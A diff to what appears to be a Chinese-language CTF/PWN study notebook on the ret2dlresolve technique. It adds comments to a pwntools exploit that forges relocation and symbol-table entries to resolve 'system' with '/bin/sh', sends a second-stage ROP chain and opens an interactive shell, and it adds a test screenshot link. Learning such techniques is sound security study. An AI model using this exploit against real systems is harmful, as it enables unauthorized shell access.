@@ -105,18 +105,19 @@ symAt = symAt + align
 #计算出表项索引
 r_sym = (symAt - symTab)/0x10
 r_info = (r_sym << 8) + 0x7
+#伪造重定位条目
 fakeRel = p32(readGot) + p32(r_info)
 
 strAt = symAt + 0x10
 st_name = strAt - strTab
-
+#伪造符号表条目
 fakeSym = p32(st_name) + p32(0) + p32(0) + p32(0x12)
 
 argStr = '/bin/sh\0'
 funcStr = 'system\0'
 
 argAt = strAt + len(funcStr)
-
+#完成第二段rop的构造
 rop2 = p32(baseAt-4)
 rop2 += p32(plt0At)
 rop2 += p32(relloc_offset)
@@ -135,6 +136,14 @@ r.send(rop2)
 r.interactive()
 
 ```  
+
+## 测试  
+
+---  
+
+![6.png](https://github.com/S0DUKU/PWNnote/blob/master/ROP/ret2dlruntime/images/6.png)  
+
+---  
 
 
 
